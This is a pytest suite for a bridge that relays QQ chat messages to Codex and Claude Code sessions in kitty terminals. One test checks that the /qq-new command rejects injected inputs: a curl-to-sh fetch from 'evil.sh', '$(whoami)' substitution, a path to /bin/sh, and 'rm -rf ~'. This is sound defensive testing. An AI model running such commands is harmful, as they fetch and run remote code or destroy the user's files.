from __future__ import annotations

import asyncio
import json
from pathlib import Path

import pytest

from codex_qq_bridge import cli
from codex_qq_bridge.agents import (
    DEFAULT_KIND,
    PROFILES,
    hint_for,
    normalize_kind,
    profile_for,
)
from codex_qq_bridge.cli import inspect_hook_definitions, install_claude_hooks
from codex_qq_bridge.config import Config
from codex_qq_bridge.inbound_image import InboundImageBatch
from codex_qq_bridge.kitty import KittyAdapter, KittyError
from codex_qq_bridge.kitty_bridge import KittyBridge

SOCKET = "unix:/run/user/1000/codex-qq-kitty-1"


class FakeQQ:
    def __init__(self) -> None:
        self.ready = True
        self.sent: list[tuple[str, str | None]] = []
        self.images: list[str] = []

    async def run(self) -> None:
        return

    async def stop(self) -> None:
        return

    async def send(self, text: str, *, reply_to: str | None = None) -> None:
        self.sent.append((text, reply_to))

    async def send_image(self, path: Path, *, reply_to: str | None = None) -> None:
        self.images.append(path.name)

    def health_status(self) -> dict[str, object]:
        return {"state": "connected"}

    @property
    def texts(self) -> list[str]:
        return [text for text, _ in self.sent]


class FakeKitty:
    def __init__(self) -> None:
        self.calls: list[tuple] = []
        self.screen = "OpenAI Codex"
        self.launch_window_id = 9
        self.sockets = [SOCKET]

    async def validate(
        self, socket: str, window_id: int, kind: str = DEFAULT_KIND
    ) -> None:
        self.calls.append(("validate", socket, window_id, kind))

    async def send_text(self, socket: str, window_id: int, text: str) -> None:
        self.calls.append(("text", socket, window_id, text))

    async def send_images(
        self, socket: str, window_id: int, paths: list[Path], prompt: str
    ) -> None:
        self.calls.append(("images", socket, window_id, list(paths), prompt))

    async def send_keys(
        self,
        socket: str,
        window_id: int,
        keys: list[str],
        blocked: frozenset[str] = frozenset(),
    ) -> None:
        self.calls.append(("keys", socket, window_id, list(keys), blocked))

    async def get_text(self, socket: str, window_id: int, limit: int) -> str:
        self.calls.append(("screen", socket, window_id, limit))
        return self.screen

    async def launch_shell(self, socket: str, cwd: Path, title: str) -> int:
        self.calls.append(("launch", socket, cwd, title))
        return self.launch_window_id

    async def managed_sockets(self) -> list[str]:
        self.calls.append(("managed_sockets",))
        return self.sockets


def make_config(tmp_path: Path) -> Config:
    return Config(
        app_id="app",
        app_secret="secret",
        owner_openid="owner",
        control_socket=tmp_path / "bridge.sock",
        state_dir=tmp_path,
        credential_file=tmp_path / "credentials.json",
    )


def make_bridge(tmp_path: Path) -> tuple[KittyBridge, FakeQQ, FakeKitty]:
    qq = FakeQQ()
    kitty = FakeKitty()
    bridge = KittyBridge(make_config(tmp_path), qq=qq, kitty=kitty)  # type: ignore[arg-type]
    return bridge, qq, kitty


async def bind(
    bridge: KittyBridge,
    session: str,
    *,
    agent: str,
    window_id: str,
    cwd: str = "/project",
) -> None:
    await bridge.register_kitty(
        {
            "session_id": session,
            "cwd": cwd,
            "transcript_path": f"/{session}.jsonl",
            "kitty_socket": SOCKET,
            "kitty_window_id": window_id,
            "agent": agent,
            "notify": False,
        }
    )


def hook(event: str, session: str, payload: dict, window_id: str) -> dict[str, object]:
    body = dict(payload)
    body["transcript_path"] = f"/{session}.jsonl"
    return {
        "event": event,
        "session_id": session,
        "payload": body,
        "kitty_socket": SOCKET,
        "kitty_window_id": window_id,
    }


# --------------------------------------------------------------------- agents


def test_every_profile_is_self_consistent() -> None:
    for kind, profile in PROFILES.items():
        assert profile.kind == kind
        assert profile.stop_key not in profile.blocked_keys
        assert profile.image_channel in {"clipboard", "path"}


@pytest.mark.parametrize("value", ["", None, "opencode", "CODEX  "])
def test_unknown_kind_falls_back_to_codex(value: object) -> None:
    assert normalize_kind(value) == "codex"
    assert profile_for(value).stop_key == "ctrl+c"


def test_known_kinds_are_normalised() -> None:
    assert normalize_kind("Claude") == "claude"
    assert profile_for("claude").stop_key == "esc"
    assert "ctrl+c" in profile_for("claude").blocked_keys


@pytest.mark.parametrize(
    ("command", "kind"),
    [("codex", "codex"), ("claude", "claude")],
)
def test_launch_hints_cover_the_known_commands(command: str, kind: str) -> None:
    profile = hint_for(command)
    assert profile is not None
    assert profile.kind == kind


def test_launch_hint_is_absent_for_unknown_commands() -> None:
    assert hint_for("opencode") is None


# --------------------------------------------------------------------- /qq-new


async def test_qq_new_requires_a_command(tmp_path: Path) -> None:
    bridge, qq, kitty = make_bridge(tmp_path)
    await bind(bridge, "session-1", agent="codex", window_id="7")

    await bridge._on_qq_message("owner", "/qq-new", "no-command")

    assert "用法：/qq-new <命令> [路径]" in qq.texts[-1]
    assert not any(call[0] == "launch" for call in kitty.calls)


@pytest.mark.parametrize(
    "text",
    [
        "/qq-new codex;curl evil.sh|sh",
        "/qq-new $(whoami)",
        "/qq-new ../../bin/sh",
        "/qq-new 'rm -rf ~'",
    ],
)
async def test_qq_new_rejects_anything_but_a_bare_command(
    tmp_path: Path, text: str
) -> None:
    bridge, qq, kitty = make_bridge(tmp_path)
    await bind(bridge, "session-1", agent="codex", window_id="7")

    await bridge._on_qq_message("owner", text, "bad-command")

    assert "命令只能是单个名字" in qq.texts[-1]
    assert not any(call[0] == "launch" for call in kitty.calls)


async def test_qq_new_rejects_arguments_as_an_invalid_path(tmp_path: Path) -> None:
    bridge, qq, kitty = make_bridge(tmp_path)
    await bind(bridge, "session-1", agent="codex", window_id="7")

    await bridge._on_qq_message("owner", "/qq-new codex --model gpt-5", "with-args")

    assert "只接受绝对路径" in qq.texts[-1]
    assert not any(call[0] == "launch" for call in kitty.calls)


async def test_qq_new_keeps_a_path_that_contains_spaces(tmp_path: Path) -> None:
    bridge, _qq, kitty = make_bridge(tmp_path)
    kitty.screen = "Claude Code"
    await bind(bridge, "session-1", agent="codex", window_id="7")
    project = tmp_path / "vibe coding" / "some project"
    project.mkdir(parents=True)

    launch = asyncio.create_task(
        bridge._on_qq_message("owner", f"/qq-new claude {project}", "spaced")
    )
    await settle_then_register(bridge, kitty, agent="claude")
    await launch

    assert ("launch", SOCKET, project, "claude") in kitty.calls
    assert bridge.bindings["session-new"].cwd == str(project)


async def settle_then_register(
    bridge: KittyBridge,
    kitty: FakeKitty,
    *,
    agent: str,
    session: str = "session-new",
    window_id: int = 9,
) -> None:
    # Real sleeps: the launch path waits for the TUI screen to settle.
    for _ in range(300):
        await asyncio.sleep(0.01)
        if any(call[0] == "text" and call[-1] == "qq-connect" for call in kitty.calls):
            break
    assert any(call[0] == "text" and call[-1] == "qq-connect" for call in kitty.calls)
    await bind(
        bridge,
        session,
        agent=agent,
        window_id=str(window_id),
        cwd="/ignored-for-pending-launch",
    )


async def test_qq_new_types_the_command_before_qq_connect(tmp_path: Path) -> None:
    bridge, qq, kitty = make_bridge(tmp_path)
    kitty.screen = "Claude Code"
    await bind(bridge, "session-1", agent="codex", window_id="7")
    project = tmp_path / "project"
    project.mkdir()

    launch = asyncio.create_task(
        bridge._on_qq_message("owner", f"/qq-new claude {project}", "new-claude")
    )
    await settle_then_register(bridge, kitty, agent="claude")
    await launch

    typed = [call for call in kitty.calls if call[0] == "text" and call[2] == 9]
    assert [call[3] for call in typed] == ["claude", "qq-connect"]
    assert bridge.bindings["session-new"].kind == "claude"
    assert "类型：claude" in qq.texts[-1]


async def test_qq_new_with_unknown_command_skips_marker_polling(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(
        "codex_qq_bridge.kitty_bridge.UNKNOWN_READY_DELAY_SECONDS", 0.0
    )
    bridge, _qq, kitty = make_bridge(tmp_path)
    kitty.screen = "nothing recognisable"
    await bind(bridge, "session-1", agent="codex", window_id="7")
    project = tmp_path / "project"
    project.mkdir()

    launch = asyncio.create_task(
        bridge._on_qq_message("owner", f"/qq-new opencode {project}", "new-unknown")
    )
    await settle_then_register(bridge, kitty, agent="codex")
    await launch

    # Without a known banner the bridge must not poll for one: had it polled,
    # this never-matching screen would have raised after the 15s marker wait.
    reads = [call for call in kitty.calls if call[0] == "screen" and call[2] == 9]
    assert len(reads) <= 3
    assert ("launch", SOCKET, project, "opencode") in kitty.calls
    assert bridge.bindings["session-new"].kitty_window_id == 9


# ------------------------------------------------------------------- labelling


async def test_binding_list_labels_every_agent(tmp_path: Path) -> None:
    bridge, qq, _ = make_bridge(tmp_path)
    await bind(bridge, "session-codex", agent="codex", window_id="7", cwd="/a")
    await bind(bridge, "session-claude", agent="claude", window_id="8", cwd="/b")

    await bridge._on_qq_message("owner", "/qq-list", "list-id")

    listing = qq.texts[-1]
    assert "已连接的会话：" in listing
    assert "* 1. [codex]" in listing
    assert "  2. [claude]" in listing


async def test_prefix_is_present_even_with_a_single_binding(tmp_path: Path) -> None:
    bridge, qq, _ = make_bridge(tmp_path)
    await bind(bridge, "session-claude", agent="claude", window_id="8")

    await bridge.hook_event(
        hook("stop", "session-claude", {"last_assistant_message": "改完了"}, "8")
    )

    assert qq.texts[-1] == "[claude #1] 改完了"


async def test_legacy_binding_without_kind_restores_as_codex(tmp_path: Path) -> None:
    (tmp_path / "kitty-bindings.json").write_text(
        json.dumps(
            {
                "active_session_id": "legacy-session",
                "bindings": [
                    {
                        "session_id": "legacy-session",
                        "generation": "gen",
                        "cwd": "/legacy",
                        "kitty_socket": SOCKET,
                        "kitty_window_id": 7,
                        "transcript_path": "/legacy.jsonl",
                        "connected_at": 1.0,
                        "last_seen_at": 1.0,
                        "state": "idle",
                    }
                ],
            }
        ),
        encoding="utf-8",
    )
    bridge, _, kitty = make_bridge(tmp_path)

    await bridge._restore_bindings()

    assert bridge.bindings["legacy-session"].kind == "codex"
    assert ("validate", SOCKET, 7, "codex") in kitty.calls


# ------------------------------------------------------------------------ keys


async def test_claude_stop_sends_esc(tmp_path: Path) -> None:
    bridge, _qq, kitty = make_bridge(tmp_path)
    await bind(bridge, "session-claude", agent="claude", window_id="8")

    await bridge._on_qq_message("owner", "/qq-stop", "stop-id")

    keys = [call for call in kitty.calls if call[0] == "keys"]
    assert keys[0][3] == ["esc"]
    assert keys[0][4] == frozenset({"ctrl+c"})


async def test_codex_stop_still_sends_ctrl_c(tmp_path: Path) -> None:
    bridge, _qq, kitty = make_bridge(tmp_path)
    await bind(bridge, "session-codex", agent="codex", window_id="7")

    await bridge._on_qq_message("owner", "/qq-stop", "stop-id")

    keys = [call for call in kitty.calls if call[0] == "keys"]
    assert keys[0][3] == ["ctrl+c"]


async def test_claude_refuses_ctrl_c_from_the_phone(tmp_path: Path) -> None:
    bridge, qq, kitty = make_bridge(tmp_path)
    await bind(bridge, "session-claude", agent="claude", window_id="8")

    await bridge._on_qq_message("owner", "/qq-key ctrl+c ctrl+c", "key-id")

    assert "claude 会话不支持 ctrl+c" in qq.texts[-1]
    assert "/qq-key esc" in qq.texts[-1]
    assert not any(call[0] == "keys" for call in kitty.calls)


# ---------------------------------------------------------------------- images


async def test_claude_receives_image_paths_instead_of_a_clipboard_paste(
    tmp_path: Path,
) -> None:
    bridge, qq, kitty = make_bridge(tmp_path)
    await bind(bridge, "session-claude", agent="claude", window_id="8")
    image = tmp_path / "shot.png"
    image.write_bytes(b"png")

    await bridge._on_qq_message(
        "owner", "这个报错怎么回事？", "img-id", InboundImageBatch.from_paths([image])
    )

    typed = next(call for call in kitty.calls if call[0] == "text")
    assert typed[3] == f"这个报错怎么回事？ {image}"
    assert not any(call[0] == "images" for call in kitty.calls)
    assert "已向 claude 提交 1 张图片" in qq.texts[-1]


async def test_codex_still_uses_the_clipboard_for_images(tmp_path: Path) -> None:
    bridge, _qq, kitty = make_bridge(tmp_path)
    await bind(bridge, "session-codex", agent="codex", window_id="7")
    image = tmp_path / "shot.png"
    image.write_bytes(b"png")

    await bridge._on_qq_message(
        "owner", "看看这个", "img-id", InboundImageBatch.from_paths([image])
    )

    assert ("images", SOCKET, 7, [image], "看看这个") in kitty.calls


# ----------------------------------------------------------------- hook events


async def test_exit_plan_mode_sends_the_whole_plan_then_a_screenshot(
    tmp_path: Path,
) -> None:
    bridge, qq, _kitty = make_bridge(tmp_path)
    await bind(bridge, "session-claude", agent="claude", window_id="8")

    await bridge.hook_event(
        hook(
            "pre_tool_use",
            "session-claude",
            {
                "tool_name": "ExitPlanMode",
                "tool_input": {
                    "plan": "# 计划\n\n第一步做这个。",
                    "planFilePath": "/plans/a.md",
                },
            },
            "8",
        )
    )

    assert qq.texts[0] == "[claude #1] [计划待确认]\n# 计划\n\n第一步做这个。"
    assert bridge.bindings["session-claude"].state == "interactive"
    # The screenshot is deferred so it catches the approval menu, not the
    # screen as it looked before ExitPlanMode ran.
    assert qq.images == []
    await asyncio.gather(*list(bridge._plan_probe_tasks.values()))
    assert len(qq.images) == 1
    assert qq.texts[-1] == "[claude #1] 请使用 /qq-key up、down 和 enter 操作确认菜单。"


async def test_exit_plan_mode_without_plan_text_reports_the_plan_file(
    tmp_path: Path,
) -> None:
    bridge, qq, _ = make_bridge(tmp_path)
    await bind(bridge, "session-claude", agent="claude", window_id="8")

    await bridge.hook_event(
        hook(
            "pre_tool_use",
            "session-claude",
            {
                "tool_name": "ExitPlanMode",
                "tool_input": {"planFilePath": "/plans/a.md"},
            },
            "8",
        )
    )

    assert "计划文件：/plans/a.md" in qq.texts[0]


async def test_ask_user_question_renders_options(tmp_path: Path) -> None:
    bridge, qq, _ = make_bridge(tmp_path)
    await bind(bridge, "session-claude", agent="claude", window_id="8")

    await bridge.hook_event(
        hook(
            "pre_tool_use",
            "session-claude",
            {
                "tool_name": "AskUserQuestion",
                "tool_input": {
                    "questions": [
                        {
                            "header": "数据库",
                            "question": "用哪个？",
                            "options": [
                                {"label": "Postgres", "description": "关系型"},
                                {"label": "SQLite", "description": "嵌入式"},
                            ],
                        }
                    ]
                },
            },
            "8",
        )
    )

    body = qq.texts[0]
    assert "[claude #1] [结构化问题]" in body
    assert "1. Postgres" in body
    assert "2. SQLite" in body


async def test_notification_is_forwarded_read_only(tmp_path: Path) -> None:
    bridge, qq, kitty = make_bridge(tmp_path)
    await bind(bridge, "session-claude", agent="claude", window_id="8")

    await bridge.hook_event(
        hook(
            "notification",
            "session-claude",
            {"message": "Claude needs your permission to use Bash"},
            "8",
        )
    )

    assert qq.texts[-1] == (
        "[claude #1] 等待你处理：Claude needs your permission to use Bash"
    )
    # A notification must never turn into a key press or an approval.
    assert not any(call[0] in {"keys", "text"} for call in kitty.calls)


async def test_own_injected_text_is_not_echoed_back_when_expanded(
    tmp_path: Path,
) -> None:
    bridge, qq, _ = make_bridge(tmp_path)
    await bind(bridge, "session-claude", agent="claude", window_id="8")
    await bridge._inject_text("看一下 @README.md", reply_to=None)
    qq.sent.clear()

    await bridge.hook_event(
        hook(
            "user_prompt_submit",
            "session-claude",
            {"prompt": "看一下 @README.md\n\n<file>...</file>"},
            "8",
        )
    )

    assert qq.texts == []


# ------------------------------------------------------------ install-claude-hooks


def claude_settings(tmp_path: Path) -> Path:
    target = tmp_path / "settings.json"
    target.write_text(
        json.dumps(
            {
                "permissions": {"allow": ["WebSearch"], "defaultMode": "auto"},
                "model": "opus",
                "hooks": {
                    "Stop": [
                        {"hooks": [{"type": "command", "command": "notify-send hi"}]}
                    ]
                },
                "statusLine": {"type": "command", "command": "/bin/true"},
            },
            ensure_ascii=False,
            indent=2,
        ),
        encoding="utf-8",
    )
    return target


def test_install_claude_hooks_preserves_existing_settings(tmp_path: Path) -> None:
    target = claude_settings(tmp_path)
    launcher = tmp_path / "venv" / "bin" / "codex-qq"

    install_claude_hooks(target, launcher)

    value = json.loads(target.read_text(encoding="utf-8"))
    assert value["permissions"] == {"allow": ["WebSearch"], "defaultMode": "auto"}
    assert value["model"] == "opus"
    assert value["statusLine"] == {"type": "command", "command": "/bin/true"}
    stop = value["hooks"]["Stop"]
    assert stop[0]["hooks"][0]["command"] == "notify-send hi"
    assert stop[1]["hooks"][0]["command"].endswith(" hook-event --agent claude")
    assert str(launcher) in stop[1]["hooks"][0]["command"]
    assert set(value["hooks"]) == {
        "Stop",
        "SessionStart",
        "SessionEnd",
        "UserPromptSubmit",
        "PreCompact",
        "PostCompact",
        "Notification",
        "PreToolUse",
    }
    assert value["hooks"]["SessionStart"][0]["matcher"] == "^(clear|resume|fork)$"
    assert (
        value["hooks"]["PreToolUse"][0]["matcher"]
        == "^(AskUserQuestion|ExitPlanMode)$"
    )
    assert len(list(tmp_path.glob("settings.json.bak.*"))) == 1
    assert target.stat().st_mode & 0o777 == 0o600


def test_install_claude_hooks_is_idempotent(tmp_path: Path) -> None:
    target = claude_settings(tmp_path)
    launcher = tmp_path / "venv" / "bin" / "codex-qq"

    install_claude_hooks(target, launcher)
    first = json.loads(target.read_text(encoding="utf-8"))
    install_claude_hooks(target, launcher)
    second = json.loads(target.read_text(encoding="utf-8"))

    assert first == second
    assert len(second["hooks"]["Stop"]) == 2


def test_install_claude_hooks_never_installs_permission_request(
    tmp_path: Path,
) -> None:
    target = claude_settings(tmp_path)
    launcher = tmp_path / "venv" / "bin" / "codex-qq"

    install_claude_hooks(target, launcher)

    assert "PermissionRequest" not in json.loads(target.read_text(encoding="utf-8"))["hooks"]


def test_doctor_inspection_distinguishes_the_two_hook_files(tmp_path: Path) -> None:
    target = claude_settings(tmp_path)
    launcher = tmp_path / "venv" / "bin" / "codex-qq"
    assert inspect_hook_definitions(
        target, ("hook-event --agent claude",)
    ) == {"installed": False, "missing": ["hook-event --agent claude"]}

    install_claude_hooks(target, launcher)

    assert inspect_hook_definitions(target, ("hook-event --agent claude",)) == {
        "installed": True,
        "missing": [],
    }


# ---------------------------------------------------------- window validation


def fake_window(title: str, cmdline: list[str]) -> list[dict]:
    return [
        {
            "tabs": [
                {
                    "windows": [
                        {
                            "id": 26,
                            "title": title,
                            "foreground_processes": [{"cmdline": cmdline}],
                        }
                    ]
                }
            ]
        }
    ]


def claude_adapter() -> KittyAdapter:
    adapter = KittyAdapter()

    async def windows(socket: str) -> list[dict]:
        del socket
        return fake_window("claude", ["node", "/opt/claude/versions/current"])

    adapter.windows = windows  # type: ignore[method-assign]
    adapter._validate_socket = lambda socket: None  # type: ignore[method-assign]
    return adapter


async def test_validate_accepts_a_claude_window_for_the_claude_kind() -> None:
    await claude_adapter().validate(SOCKET, 26, "claude")


async def test_validate_rejects_a_claude_window_for_the_codex_kind() -> None:
    with pytest.raises(KittyError, match="未识别到 codex"):
        await claude_adapter().validate(SOCKET, 26, "codex")


async def test_doctor_detects_the_agent_of_the_terminal_it_runs_in(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("KITTY_LISTEN_ON", SOCKET)
    monkeypatch.setenv("KITTY_WINDOW_ID", "26")
    monkeypatch.setattr(cli.shutil, "which", lambda name: f"/usr/bin/{name}")
    adapter = claude_adapter()
    adapter.clipboard_image_paste_available = lambda: True  # type: ignore[method-assign]
    monkeypatch.setattr(cli, "KittyAdapter", lambda command: adapter)
    monkeypatch.setattr(
        cli,
        "inspect_hook_definitions",
        lambda path, required=("hook-event",): {"installed": True, "missing": []},
    )

    async def fake_exchange(config: Config, payload: dict) -> dict:
        del config, payload
        return {"ok": True, "qq": True, "session_id": "s", "qq_gateway": {}}

    monkeypatch.setattr(cli, "exchange", fake_exchange)
    printed: list[str] = []
    monkeypatch.setattr("builtins.print", lambda *a, **k: printed.append(a[0]))

    code = await cli.doctor(make_config(tmp_path), as_json=True)

    report = json.loads(printed[-1])
    assert code == 0
    assert report["ok"] is True
    assert report["kitty_agent"] == "claude"
    assert "kitty_error" not in report


async def test_qq_connect_is_retried_with_enter_when_the_first_one_is_swallowed(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(
        "codex_qq_bridge.kitty_bridge.QQ_CONNECT_ATTEMPT_TIMEOUT_SECONDS", 0.05
    )
    bridge, _qq, kitty = make_bridge(tmp_path)
    kitty.screen = "OpenAI Codex"
    await bind(bridge, "session-1", agent="codex", window_id="7")
    project = tmp_path / "project"
    project.mkdir()
    typed = kitty.send_text

    async def swallow_enter(socket: str, window_id: int, text: str) -> None:
        await typed(socket, window_id, text)
        if text == "qq-connect":
            # Codex kept the pasted text but dropped the Enter that followed.
            kitty.screen = "OpenAI Codex\n> qq-connect"

    kitty.send_text = swallow_enter  # type: ignore[method-assign]

    launch = asyncio.create_task(
        bridge._on_qq_message("owner", f"/qq-new codex {project}", "retry")
    )
    nudge = ("keys", SOCKET, 9, ["enter"], frozenset())
    for _ in range(200):
        await asyncio.sleep(0.01)
        if nudge in kitty.calls:
            break
    assert nudge in kitty.calls, "swallowed Enter was never re-sent"
    await bind(
        bridge,
        "session-new",
        agent="codex",
        window_id="9",
        cwd="/ignored-for-pending-launch",
    )
    await launch

    # The text was pasted once; the recovery is a bare Enter, not a re-paste.
    pastes = [
        call
        for call in kitty.calls
        if call[0] == "text" and call[2] == 9 and call[3] == "qq-connect"
    ]
    assert len(pastes) == 1
    assert bridge.bindings["session-new"].kitty_window_id == 9
